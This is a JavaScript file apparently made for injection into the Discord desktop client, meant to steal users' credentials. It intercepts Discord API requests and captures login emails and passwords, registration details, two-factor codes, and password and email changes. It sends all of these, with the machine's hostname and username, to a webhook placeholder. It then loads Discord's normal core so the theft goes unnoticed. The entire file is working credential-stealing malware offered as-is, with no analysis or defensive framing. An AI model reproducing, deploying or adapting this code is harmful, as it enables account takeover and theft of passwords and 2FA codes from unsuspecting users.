const https = require("https");
const os = require("os");
const { session } = require("electron");

const WEBHOOK = "%WEBHOOK%";

function post(data) {
  const body = JSON.stringify({
    username: "Discord Injection",
    embeds: [{
      title: "🔐 Discord Event",
      color: 0x5865f2,
      fields: Object.entries(data).map(([k,v])=>({name:k,value:"```"+(v||"N/A").toString().slice(0,1000)+"```",inline:false})),
      footer: { text: os.hostname()+" | "+os.userInfo().username },
      timestamp: new Date().toISOString()
    }]
  });
  const url = new URL(WEBHOOK);
  const req = https.request({ hostname:url.hostname, path:url.pathname+url.search, method:"POST", headers:{"Content-Type":"application/json","Content-Length":Buffer.byteLength(body)} });
  req.on("error",()=>{});
  req.write(body);
  req.end();
}

let email = "";
let password = "";

post({ Event: "🟢 Discord Opened", Host: os.hostname(), User: os.userInfo().username });

session.defaultSession.webRequest.onBeforeRequest(
  { urls: ["https://discord.com/api/*", "https://discordapp.com/api/*"] },
  (details, callback) => {
    callback({});
    try {
      const raw = details.uploadData?.[0]?.bytes;
      if (!raw) return;
      const body = Buffer.isBuffer(raw) ? raw.toString("utf-8") : raw.toString();
      if (!body) return;
      const parsed = JSON.parse(body);
      const url = details.url;

      if (url.includes("/auth/login")) {
        if (parsed.login) { email = parsed.login; password = parsed.password||""; }
        post({ Event: "Login", Email: parsed.login||"?", Password: parsed.password||"?" });
      }
      if (url.includes("/auth/register")) {
        post({ Event: "Register", Email: parsed.email||"?", Password: parsed.password||"?" });
      }
      if (url.includes("/mfa/totp")) {
        post({ Event: "2FA", Email: email, Password: password, Code: parsed.code||"?" });
      }
      if (url.includes("/users/@me") && parsed.password) {
        if (parsed.new_password) post({ Event: "Password Changed", Old: parsed.password, New: parsed.new_password });
        if (parsed.email) post({ Event: "Email Changed", NewEmail: parsed.email, Password: parsed.password });
      }
    } catch {}
  }
);

module.exports = require('./core.asar');
